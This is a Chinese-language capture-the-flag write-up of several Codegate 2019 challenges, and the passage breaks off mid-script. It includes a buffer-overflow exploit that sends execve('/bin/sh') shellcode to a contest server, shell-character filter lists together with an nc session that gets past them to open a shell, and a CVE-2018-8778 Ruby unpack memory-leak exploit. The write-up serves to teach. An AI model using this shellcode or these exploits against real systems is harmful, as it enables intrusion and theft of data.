接下来就直接将被加密的函数patch一下，进一步看看。需要patch的其实很多，工程浩大，贴上转自大佬的patch脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364key1 = 'lOv3'key2 = 'D0l1'key3 = 'HuNgRYT1m3'key4 = 'F0uRS3aS0n'key5 = 'T1kT4kT0Kk'def xor(arr, key): for i in range(len(arr)): arr[i] = arr[i] ^ ord(key[i % len(key)]) return arrpatches = [ (0x341D, 0xf0, key1), (0x33FF, 0x1e, key1), (0x330F, 0xf0, key1), (0x32DE, 0x31, key1), (0x32C0, 0x1e, key1), (0x3197, 0x129, key1), (0x30D4, 0x0C3, key1), (0x2D55, 0x0FA, key2), (0x2C25, 0x112, key2), (0x2D37, 0x1e, key2), (0x27E9, 0x44, key2), (0x29B9, 0x0E6, key2), (0x2B2B,0x0FA, key2), (0x271C, 0x0CD, key2), (0x28B5, 0xe6, key2), (0x299B, 0x1e, key2), (0x2A9F, 0x4E, key2), (0x2AED, 0x3e, key2), (0x282D, 0x44, key2), (0x2871, 0x44, key2), (0x20E2, 0x18d, key3), (0x201F, 0xc3, key3), (0x1B0A, 0xf0, key4), (0x19F2, 0x0FA, key4), (0x1AEC, 0x1e, key4), (0x192C, 0xa8, key4), (0x19D4, 0x1e, key4), (0x16D0, 0xc3, key4), (0x11BB, 0x131, key5), (0x0F25, 0x0DC, key5), (0x108B, 0x130, key5), (0x0DE7, 0x120, key5), (0x0F07, 0x1e, key5), (0x1001, 0x1e, key5), (0x101F, 0x4e, key5), (0x106D, 0x1e, key5), (0x0C8C, 0x158, key5)]with open('patched', 'wb') as patched: with open('./KingMaker', 'rb') as binary: data = bytearray(binary.read()) for offset, size, key in patches: data[offset:offset+size] = xor(data[offset:offset+size], key) patched.write(data) patched.close() 把patch后的elf拖进ida后，就能把所有的过程理清楚了，最麻烦的方法就是把所有的可能都记录下来，递归一下。放上大佬的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python def addArr(a,b): c = [] for i in range(5): c.append(a[i]+b[i]) return c def addLevel1(a): x = [(\"1,lOv3,1,2,1,1\", [2,0,1,1,2]), (\"1,lOv3,1,2,1,2\", [2,-1,0,1,-1]), (\"1,lOv3,1,2,1,3\", [2,2,0,1,0]), (\"1,lOv3,1,2,2,1\", [2,0,2,0,2]), (\"1,lOv3,1,2,2,2\", [2,-1,1,0,-1]), (\"1,lOv3,1,2,2,3\", [2,2,1,0,0]), (\"1,lOv3,1,2,3,1\", [2,0,3,1,2]), (\"1,lOv3,1,2,3,2\", [2,-1,2,1,-1]), (\"1,lOv3,1,2,3,3\", [2,2,2,1,0])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel2(n,x[i][0]) def addLevel2(a,s): x = [(\"D0l1,1,1,1,1,1\", [0,1,-1,3,0]), (\"D0l1,1,1,1,1,2\", [0,1,0,3,0]), (\"D0l1,1,1,1,2,1\", [0,1,-1,3,0]), (\"D0l1,1,1,1,2,2\", [0,1,0,3,0]), (\"D0l1,1,1,2,1\", [0,1,-1,3,0]), (\"D0l1,1,1,2,2\", [0,1,0,3,0]), (\"D0l1,1,2,1,1,1,1,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,1,1,1,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,1,1,2,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,1,1,2,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,1,2,1\", [2,2,1,1,2]), (\"D0l1,1,2,1,1,2,2\", [2,3,2,1,2]), (\"D0l1,1,2,1,2,1,1,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,2,1,1,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,2,1,2,1\", [2,2,0,2,0]), (\"D0l1,1,2,1,2,1,2,2\", [2,2,1,2,0]), (\"D0l1,1,2,1,2,2,1\", [2,2,1,1,2]), (\"D0l1,1,2,1,2,2,2\", [2,3,2,1,2]), (\"D0l1,1,3,1,1,1,1\", [2,3,0,2,0]), (\"D0l1,1,3,1,1,1,2\", [2,3,1,2,0]), (\"D0l1,1,3,1,1,2,1\", [2,3,0,2,0]), (\"D0l1,1,3,1,1,2,2\", [2,3,1,2,0]), (\"D0l1,1,3,1,2,1\", [2,3,1,1,2]), (\"D0l1,1,3,1,2,2\", [2,4,2,1,2])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel3(n,s+','+x[i][0]) def addLevel3(a, s): x = [(\"HuNgRYT1m3,1,1,2\", [1,-1,0,3,2]), (\"HuNgRYT1m3,1,2,1\", [0,0,1,1,0]), (\"HuNgRYT1m3,1,2,3\", [1,0,1,1,1]), (\"HuNgRYT1m3,2,1,2\", [1,-2,1,2,2]), (\"HuNgRYT1m3,2,2,1\", [0,-1,2,0,0]), (\"HuNgRYT1m3,2,2,3\", [1,-1,2,0,1]), (\"HuNgRYT1m3,3,1,2\", [1,-2,1,3,2]), (\"HuNgRYT1m3,3,2,1\", [0,-1,1,1,0]), (\"HuNgRYT1m3,3,2,3\", [1,-1,1,1,1])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel4(n, s+','+x[i][0]) def addLevel4(a,s): x = [(\"F0uRS3aS0n,1,1,AAAA,1,1,2\", [0,2,2,3,0]), (\"F0uRS3aS0n,1,1,AAAA,1,2\", [0,2,1,2,0]), (\"F0uRS3aS0n,1,1,AAAA,2\", [0,2,1,2,0])] for i in range(len(x)): n = addArr(a,x[i][1]) addLevel5(n,s+','+x[i][0]) def addLevel5(a,s): x = [(\"T1kT4kT0Kk,2,1,1,2,1\", [-1,0,0,1,1]), (\"T1kT4kT0Kk,2,1,2,2,1\", [0,0,1,2,1]), (\"T1kT4kT0Kk,3,2,2,1\", [0,0,0,2,2])] for i in range(len(x)): n = addArr(a,x[i][1]) for j in range(5): if (n[j] != 5): break if (j == 4): final = s+','+x[i][0] print(final.replace(',','\\n')) quit() addLevel1([0,0,0,0,0]) 将输出的过程pipe到nc就行了：./solve.py | nc 110.10.147.104 13152。 大佬还给出一种pwn的做法，也不是很复杂。显然所有的scanf(&quot;%s&quot;, &amp;buf);都存在bof，所有的key都能是可以被覆盖修改的，例如这个func： 123456789101112131415void __fastcall __noreturn vul(__int64 key)&#123; char buf; // [rsp+10h] [rbp-30h] unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); put_s(\"King : You have only 1 chance.\"); __isoc99_scanf(\"%s\", &amp;buf); if ( (unsigned int)check(&amp;buf) ) &#123; encrypt_func(sub_4016D0, dword_607114, (const char *)key); sub_4016D0(0, 1, 1, 2, 0); &#125; end_game(\"King : Wrong! You don't have ability to solve the worries of the people!\", 0);&#125; 这里先是要过check： 123456789101112131415161718192021222324signed __int64 __fastcall check(const char *input)&#123; int v2; // [rsp+18h] [rbp-78h] signed int i; // [rsp+1Ch] [rbp-74h] char dest[16]; // [rsp+20h] [rbp-70h] char v5[26]; // [rsp+30h] [rbp-60h] char v6[26]; // [rsp+50h] [rbp-40h] char v7; // [rsp+72h] [rbp-1Eh] unsigned __int64 v8; // [rsp+78h] [rbp-18h] v8 = __readfsqword(0x28u); qmemcpy(v5, \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\", sizeof(v5)); strcpy(v6, \"ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP\"); v7 = 0; v2 = 0; strncpy(dest, input, 5uLL); for ( i = 5; i &lt; strlen(input); ++i ) &#123; if ( v5[(input[i] - 65 + dest[v2] - 65) % 26] != v6[i] ) return 0LL; v2 = (v2 + 1) % 5; &#125; return 1LL;&#125; 符合条件的字串为AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP。过了check之后，覆盖掉key，送上shellcode和key的异或，并且确保异或后的字串中不存在使scanf断开的字符即可。之后程序会调用encrypt_func解密shellcode最后get shell。大佬的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *r = remote('110.10.147.104', 13152)context.arch = 'amd64'payload = '''1 lOv3 1 211 D0l1 112 1 HuNgRYT1m311 2F0uRS3aS0n 1 1'''r.sendline(payload)shellcode = ''' /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\\x00' */ push 0x68 xor eax, eax mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array ['sh\\x00'] */ /* push 'sh\\x00' */ push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi add rsi, rsp push rsi /* 'sh\\x00' */ mov rsi, rsp xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall'''xorkey = [ord(x) ^ ord(y) for x, y in zip('\\x13x\\xfc\\xb7\\x1b\\xb0\\x8ds\\xb9\\x13\\xba\\xb9\\x00\\xaa\\xdaf\\x95\\xda&#125;\\x9e\\x02\\xb90\\xbe\\xd8&amp;\\x1f\\t\\x10n\\xcdu\\x89S\\x83\\xbad jNF\\xbb`#\\t\\x13a\\xd8u\\x96G\\xe0\\xfcW5iAS\\xbb&#123;\"jUR\\xd8v\\x95R\\xe0\\xe7Ci/rS\\xb8t\\x04jNF\\xbb0\\xa2R\\xe3\\xe8V|4f0\\xfeG\\x19iAS\\xbb+\\xaa1\\xa5\\xdbV\\x0c;s0\\xd1\\x86t5R\\xbb\\xc5\\x92\\xac\\xcf\\xd1\\xa6t5R\\xbb\\xdf\\x92\\xac\\xcf\\xe5&#123;\\x15/rS\\xb8THjNF\\xbbxC\\t\\x13a\\xd8%i\\x1c\\x10u\\xd9V\\xce8s0/\\xcf\\xc94\\xdb\\xa3\\xba\\xa7\\xec T\\x060\\xcdRS3a\\xbb\\xda\\x9e\\xb9\\xcf\\xcdRS3a\\xbbI\\x90\\xb9\\xcf', asm(shellcode))]xorkey = bytearray(xorkey)print hexdump(xorkey)assert all(x not in str(xorkey) for x in '\\x00 \\r\\r\\n\\t')payload = ('AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP').ljust(0xc0, '\\x00') + xorkey + '\\x00'r.sendline(payload)r.interactive() 20000给了一个64位的elf还有20000个.so文件。拖进ida看到main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v3; // rax signed __int64 result; // rax void *v5; // rdi char *v6; // rax int number; // [rsp+Ch] [rbp-94h] void (__fastcall *v8)(void *, const char *); // [rsp+10h] [rbp-90h] void *handle; // [rsp+18h] [rbp-88h] char s; // [rsp+20h] [rbp-80h] int v11; // [rsp+80h] [rbp-20h] int v12; // [rsp+84h] [rbp-1Ch] unsigned __int64 v13; // [rsp+88h] [rbp-18h] v13 = __readfsqword(0x28u); backgroud(); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(&amp;s, 0, 0x60uLL); v11 = 0; printf(\"INPUT : \", 0LL, &amp;v12); __isoc99_scanf(\"%d\", &amp;number); if ( number &lt;= 0 &amp;&amp; number &gt; 20000 ) &#123; printf(\"Invalid Input\", &amp;number); exit(-1); &#125; sprintf(&amp;s, \"./20000_so/lib_%d.so\", (unsigned int)number); handle = dlopen(&amp;s, 1); if ( handle ) &#123; v5 = handle; v8 = (void (__fastcall *)(void *, const char *))dlsym(handle, \"test\"); if ( v8 ) &#123; v8(v5, \"test\"); dlclose(handle); result = 0LL; &#125; else &#123; v6 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v6); dlclose(handle); result = 1LL; &#125; &#125; else &#123; v3 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v3); result = 1LL; &#125; return result;&#125; 程序要求我们输入一个0～20000之间的数字，然后会读取任意一个.so文件。主要是两个函数dlopen和dlsym，前者打开动态链接库，并返回一个句柄；后者用来打开动态链接库中的函数。 随机打开几个.so文件看看有什么。lib_1139.so中看到一个test()函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed __int64 test()&#123; char *v0; // rax signed __int64 result; // rax char *v2; // rax void (__fastcall *v3)(char *, char *); // [rsp+0h] [rbp-B0h] void (__fastcall *v4)(char *); // [rsp+8h] [rbp-A8h] void *handle; // [rsp+10h] [rbp-A0h] void *v6; // [rsp+18h] [rbp-98h] char buf; // [rsp+20h] [rbp-90h] __int16 v8; // [rsp+50h] [rbp-60h] char s; // [rsp+60h] [rbp-50h] __int16 v10; // [rsp+90h] [rbp-20h] unsigned __int64 v11; // [rsp+98h] [rbp-18h] v11 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x30uLL); v8 = 0; memset(&amp;s, 0, 0x30uLL); v10 = 0; handle = dlopen(\"./20000_so/lib_17305.so\", 1); if ( handle ) &#123; v3 = (void (__fastcall *)(char *, char *))dlsym(handle, \"filter1\"); v6 = dlopen(\"./20000_so/lib_2850.so\", 1); if ( v6 ) &#123; v4 = (void (__fastcall *)(char *))dlsym(v6, \"filter2\"); puts(\"This is lib_1139 file.\"); puts(\"How do you find vulnerable file?\"); read(0, &amp;buf, 0x32uLL); v3(&amp;buf, &amp;buf); v4(&amp;buf); sprintf(&amp;s, \"ls \\\"%s\\\"\", &amp;buf); system(&amp;s); dlclose(handle); dlclose(v6); result = 0LL; &#125; else &#123; v2 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v2); result = 0xFFFFFFFFLL; &#125; &#125; else &#123; v0 = dlerror(); fprintf(stderr, \"Error: %s\\n\", v0); result = 0xFFFFFFFFLL; &#125; return result;&#125; 看到是读取输入作为参数来执行ls命令。在lib_12071.so里找到一个filter1()函数： 12345678910111213141516171819202122232425char *__fastcall filter1(const char *a1)&#123; char *result; // rax if ( strchr(a1, ';') ) exit(0); if ( strchr(a1, '*') ) exit(0); if ( strchr(a1, '|') ) exit(0); if ( strchr(a1, '&amp;') ) exit(0); if ( strchr(a1, '$') ) exit(0); if ( strchr(a1, '`') ) exit(0); if ( strchr(a1, '&gt;') ) exit(0); if ( strchr(a1, '&lt;') ) exit(0); result = strchr(a1, 'r'); if ( result ) exit(0); return result;&#125; 过滤了一些字符。在lib_9494.so中还有一个filter2()函数： 1234567891011121314151617181920212223242526272829char *__fastcall filter2(const char *a1)&#123; char *result; // rax if ( strchr(a1, 'v') ) exit(0); if ( strchr(a1, 'm') ) exit(0); if ( strchr(a1, 'p') ) exit(0); if ( strchr(a1, 'd') ) exit(0); if ( strchr(a1, 'n') ) exit(0); if ( strstr(a1, \"bin\") ) exit(0); if ( strstr(a1, \"sh\") ) exit(0); if ( strstr(a1, \"bash\") ) exit(0); if ( strchr(a1, 'f') ) exit(0); if ( strchr(a1, 'l') ) exit(0); result = strchr(a1, 'g'); if ( result ) exit(0); return result;&#125; 也是过滤了一些字符，还有bash和sh这些字串。那么基本可以确认所有的.so文件必定只包含着三个标志。接下来主要是分析.so文件中的这三个symbol：test、filter1、filter2。test是main函数中会调用的，filter则是在一些文件的test()中会调用，其中filter2()显然是最关键的一个地方。用r2pipe来对文件进行分析（安装方法）： 首先遍历每个文件，查找其中的符号并加入到列表中： 1234567891011121314151617181920import r2pipetest = []filter1 = []filter2 = []for i in range(1, 20000+1): print i r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) if 'dlopen' in r2.cmd('ii'): test.append(i) if 'filter1' in r2.cmd('is'): filter1.append(i) if 'filter2' in r2.cmd('is'): filter2.append(i) r2.quit()print testprint filter1print filter2 先查找一下filter1每个文件的symbol是否有不同的地方： 12345678910111213141516171819for i in filter1: r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) r2.cmd('aaa') keys = ['0x3b', '0x2a', '0x7c', '0x26', '0x24', '0x60', '0x3e', '0x3c', '0x72'] out = r2.cmd('pdf @ sym.filter1') res = [] same = True for k in keys: if k not in out: same = False if not same: res.append(i) print str(i) r2.quit()print 'res: ', res lib_4323.so中的filter1，与之前相比少过滤了一个|： 1234567891011121314151617181920212223char *__fastcall filter1(const char *a1)&#123; char *result; // rax if ( strchr(a1, ';') ) exit(0); if ( strchr(a1, '*') ) exit(0); if ( strchr(a1, '`') ) exit(0); if ( strchr(a1, '&amp;') ) exit(0); if ( strchr(a1, '$') ) exit(0); if ( strchr(a1, '&gt;') ) exit(0); if ( strchr(a1, '&lt;') ) exit(0); result = strchr(a1, 'r'); if ( result ) exit(0); return result;&#125; 接下来在test中找一下用了这个filter的.so文件： 1234567for i in test: r2 = r2pipe.open('./20000_so/lib_&#123;&#125;.so'.format(i)) if r2.cmd('iz~./20000_so/lib_4323.so') != '': print i r2.quit() 最后筛选出lib_17394.so，发现其中有： 12sprintf(&amp;s, \"%s 2 &gt; /dev/null\", &amp;buf, v4);system(&amp;s); 直接送一个sh上去就能拿到shell了： 1234567891011121314151617181920212223# qianfei @ qianfeideMacBook-Air in ~/Desktop/2019-codegate/20000 [12:41:06] $ nc 110.10.147.106 15959 /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$__ $$ /$$$_ $$ /$$$_ $$ /$$$_ $$ /$$$_ $$ |__/ \\ $$| $$$$\\ $$| $$$$\\ $$| $$$$\\ $$| $$$$\\ $$ /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ /$$____/ | $$\\ $$$$| $$\\ $$$$| $$\\ $$$$| $$\\ $$$$ | $$ | $$ \\ $$$| $$ \\ $$$| $$ \\ $$$| $$ \\ $$$ | $$$$$$$$| $$$$$$/| $$$$$$/| $$$$$$/| $$$$$$/ |________/ \\______/ \\______/ \\______/ \\______/ INPUT : 17394This is lib_17394 file.How do you find vulnerable file?shls2000020000_so20000_so.tar.gzflagcat flagflag&#123;Are_y0u_A_h@cker_in_real-word?&#125; algo_auth1234567891011121314151617181920212223242526272829303132$ nc 110.10.147.104 15712 ==&gt; Hi, I like an algorithm. So, i make a new authentication system.==&gt; It has a total of 100 stages.==&gt; Each stage gives a 7 by 7 matrix below sample.==&gt; Find the smallest path sum in matrix, by starting in any cell in the left column and finishing in any cell in the right column, and only moving up, down, and right.==&gt; The answer for the sample matrix is 12.==&gt; If you clear the entire stage, you will be able to authenticate.[sample]99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 1 1 1 99 1 1 1 1 99 1 99 1 99 99 99 99 1 1 1 99 If you want to start, type the G key within 10 seconds....&gt;&gt; G*** STAGE 1 ***18 17 16 15 14 13 12 9 11 13 15 17 19 21 18 17 16 15 14 13 12 14 16 18 20 22 24 26 16 15 14 13 12 11 10 6 8 10 12 14 16 18 22 21 20 19 18 17 16 Answer within 10 seconds &gt;&gt;&gt; 1wrong!! Try again!! 一道ppc，在7*7的矩阵中寻找从最左列到最右列的最短路。分别在csdn和geeksforgeeks上找到dijkstra实现的寻找矩阵最短路。回答完100道题目之后，会告诉你@@@@@ Congratz! Your answers are an answer，尝试将所有的答案转ascii，得到base64后的flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/env pythonfrom pwn import *import numpy as npimport base64context.log_level = 'debug'# p = remote('110.10.147.104', 15712)p = remote('110.10.147.109', 15712)p.sendlineafter('If you want to start, type the G key within 10 seconds....&gt;&gt;', 'G')def minDistance(distances, sptSet, dimension): min_ = np.inf min_index = 0 for i in range(dimension): if sptSet[i] == False and distances[i] &lt; min_: min_ = distances[i] min_index = i return min_indexdef dijkstra(graph, source, dimension): sptSet = [] distances = [] for i in range(dimension): distances.append(np.inf) sptSet.append(False) distances[source] = 0 for i in range(dimension): u = minDistance(distances, sptSet, dimension) sptSet[u] = True for v in range(dimension): if sptSet[v] == False and graph[u][v] &gt; 0 and distances[u] + graph[u][v] &lt; distances[v]: distances[v] = distances[u] + graph[u][v] # print distances res = [] for i in range(1, 8): res.append(distances[i * 7 - 1]) print res return resdef xy2num(x, y): if x &lt; 0 or x &gt;= 7: return -1 if y &lt; 0 or y &gt;= 7: return -1 return y * 7 + xflag = ''for i in range(100): p.recvuntil('*** STAGE &#123;&#125; ***\\n'.format(str(i + 1))) matrix = [] for j in range(7): t = p.recvline()[:-1] row = [] for k in range(len(t) / 3): # print type(t[3*k:3*(k+1)].strip(' ')) row.append(int(t[3*k:3*(k+1)].strip(' '))) matrix.append(row) # print matrix min_length = np.inf adj = [] for y in range(7): for x in range(7): t = [0] * (7 * 7) if xy2num(x - 1, y) &gt;= 0: t[xy2num(x - 1, y)] = matrix[y][x - 1] if xy2num(x + 1, y) &gt;= 0: t[xy2num(x + 1, y)] = matrix[y][x + 1] if xy2num(x, y - 1) &gt;= 0: t[xy2num(x, y - 1)] = matrix[y - 1][x] if xy2num(x, y + 1) &gt;= 0: t[xy2num(x, y + 1)] = matrix[y + 1][x] adj.append(t) for j in range(7): tmp = min(dijkstra(adj, j * 7, 7 * 7)) tmp += matrix[j][0] min_length = min(min_length, tmp) flag += chr(min_length) payload = str(min_length) p.sendlineafter('Answer within 10 seconds &gt;&gt;&gt;', payload)print 'flag:', base64.b64decode(flag)p.interactive() 还有另一种做法代码更简短一点就是用背包： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythonfrom pwn import *import base64context.log_level = 'debug'# p = remote('110.10.147.104', 15712)p = remote('110.10.147.109', 15712)p.sendlineafter('If you want to start, type the G key within 10 seconds....&gt;&gt;', 'G')def cal(m): size = len(m) res = [] for i in range(size): res.append(m[i][size - 1]) for i in range(size - 2, -1, -1): res[0] += m[0][i] for j in range(1, size): res[j] = min(res[j - 1] + m[j][i], res[j] + m[j][i]) for j in range(size - 2, -1, -1): res[j] = min(res[j], res[j + 1] + m[j][i]) return min(res)flag = ''for i in range(100): p.recvuntil('*** STAGE &#123;&#125; ***\\n'.format(str(i + 1))) matrix = [] for j in range(7): t = p.recvline()[:-1] row = [] for k in range(len(t) / 3): # print type(t[3*k:3*(k+1)].strip(' ')) row.append(int(t[3*k:3*(k+1)].strip(' '))) matrix.append(row) # print matrix min_length = cal(matrix) flag += chr(min_length) payload = str(min_length) p.sendlineafter('Answer within 10 seconds &gt;&gt;&gt;', payload)print 'flag:', base64.b64decode(flag)p.interactive() THE Matrix看了PPP大佬们的writeup，下了个BGB来调试gameboy，同时可以查看内存以及patch。 放上脚本： 1234567891011121314#!/usr/bin/env pythondata = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x7E, 0x7E, 0x7E, 0x7E, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x60, 0x60, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x62, 0x62, 0x66, 0x66, 0x7E, 0x7E, 0x78, 0x78, 0x6C, 0x6C, 0x6E, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC1, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0x7E, 0x7E, 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF, 0x7E, 0x7E, 0xC3, 0xC3, 0xE3, 0xE3, 0xF3, 0xF3, 0xFB, 0xFB, 0xDF, 0xDF, 0xCF, 0xCF, 0xC7, 0xC7, 0xC3, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x3C, 0x7E, 0x7E, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xFE, 0xFE, 0xFE, 0xFE, 0xC6, 0xC6, 0xC0, 0xC0, 0xDF, 0xDF, 0xC1, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xF0, 0xF0, 0xF0, 0xF0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xF0, 0xF0, 0xF0, 0xF0, 0x0F, 0x0F, 0x0F, 0x0F, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x0F, 0x0F, 0x0F, 0x0F, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x7E, 0x7E, 0x7E, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x7E, 0x7E, 0x7E, 0x7E, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFE, 0xFE, 0xFE, 0xFE, 0x82, 0x00, 0xEE, 0x6C, 0x82, 0x00, 0xBA, 0x38, 0x00, 0x00, 0x40, 0x00, 0xC3, 0xC3, 0xE3, 0xE3, 0xF3, 0xF3, 0xFB, 0xFB, 0xFF, 0xFF, 0xDF, 0xDF, 0xCF, 0xCF, 0xC7, 0xC7, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xFF, 0xFF, 0x81, 0x81, 0xA5, 0xA5, 0x81, 0x81, 0x7E, 0x7E, 0xFF, 0xFF, 0x81, 0xE7, 0x81, 0xFF, 0x81, 0xDB, 0x81, 0xDB, 0x81, 0xDB, 0x81, 0xC3, 0xFF, 0xFF, 0xFF, 0xFF, 0x81, 0xFF, 0x81, 0xFF, 0x81, 0x99, 0x81, 0x99, 0x81, 0x99, 0x81, 0x99, 0xFF, 0xFF, 0x7E, 0x7E, 0xC3, 0xC3, 0x81, 0x81, 0xFF, 0xFF, 0xA5, 0xA5, 0x81, 0x81, 0xC3, 0xDB, 0x7E, 0x7E, 0x7E, 0x7E, 0xFF, 0xE7, 0xFF, 0xC3, 0xFF, 0xFF, 0xFF, 0xA5, 0xFF, 0x81, 0xE7, 0xDB, 0x7E, 0x7E, 0x1F, 0x1F, 0x31, 0x3F, 0x61, 0x7F, 0xC1, 0xFF, 0xC1, 0xFF, 0x61, 0x7F, 0x3F, 0x3F, 0x1F, 0x1F, 0xFF, 0xFF, 0x9D, 0xE3, 0x8D, 0xF3, 0x85, 0xFB, 0xA1, 0xDF, 0xB1, 0xCF, 0xB9, 0xC7, 0xFF, 0xFF]tiles = []for x in range(18): tiles += [[data[x * 16 + y] for y in range(16)]]for c in [13, 0, 1, 2, 3, 2, 4, 16, 5, 4, 8, 7, 4, 5, 6, 7, 8]: tile = tiles[c] for x in tile: print ('0'*8 + bin(x)[2:])[-8:].replace('0', ' ').replace('1', '0') print '\\n' mini converter给了一份ruby的源码。看了writeup知道了是CVE-2018-8778。ruby的版本在2.5.1之前存在这个格式化字符串的整数溢出漏洞，漏洞如下： 1puts input.unpack(\"C*#&#123;input&#125;.length\") 这里将输入转换成unpack方法，我们就可以控制unpack的结果来泄漏flag。在ruby的unpack格式中，@可以跳过参数长度给的偏移。如果我们送一个很大的正数，那么就会溢出成负数。从而我们可以泄露之前的内容，包括flag。这里放一下大佬的exp： 12345678910111213141516from pwn import *context.log_level = 'debug'p = remote('110.10.147.105', 12137)p.recvuntil('to exit\\n')targlen = 0x10000for i in range(1, 100): payload = 'a @&#123;&#125;a&#123;&#125; '.format(2**64 - targlen*i, targlen + 0x100) p.sendline(payload) p.recvuntil('hex\\n') p.sendline('1') print 'memdump #&#123;&#125;'.format(i) data = p.recvuntil('to exit\\n') if 'FLAG&#123;' in data: st = data.find('FLAG&#123;') print data[st:data.find('&#125;', st) + 1] break PyProt3ct一道有点难的虚拟机，所有的变量还有函数名几乎都是形如O0O0OOO00OO00O000的混淆。先简单地解混淆： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import ref = open('play.py.bak')t = f.read()f.close()# funcpat = r'def ([O0]&#123;17&#125;)'reg = re.compile(pat)func = reg.findall(t)[:-1]for i in range(len(func)): t = t.replace(func[i], 'f&#123;&#125;'.format(str(i)))# argpat = r'def f\\d\\d?\\(([O0]&#123;17&#125;)\\)'reg = re.compile(pat)arg = reg.findall(t)for i in range(len(arg)): t = t.replace(arg[i], 'dic')# elsepat = r'([O0]&#123;17&#125;)=dict\\(\\)'reg = re.compile(pat)dic = reg.findall(t)for i in range(len(dic)): t = t.replace(dic[i], 'dic')pat = r'([O0]&#123;17&#125;)=1000'reg = re.compile(pat)ret_addr = reg.findall(t)for i in range(len(ret_addr)): t = t.replace(ret_addr[i], 'ret_addr')pat = r'([O0]&#123;17&#125;)=1001'reg = re.compile(pat)ret_val = reg.findall(t)for i in range(len(ret_val)): t = t.replace(ret_val[i], 'ret_val')pat = r'([O0]&#123;17&#125;)=2001'reg = 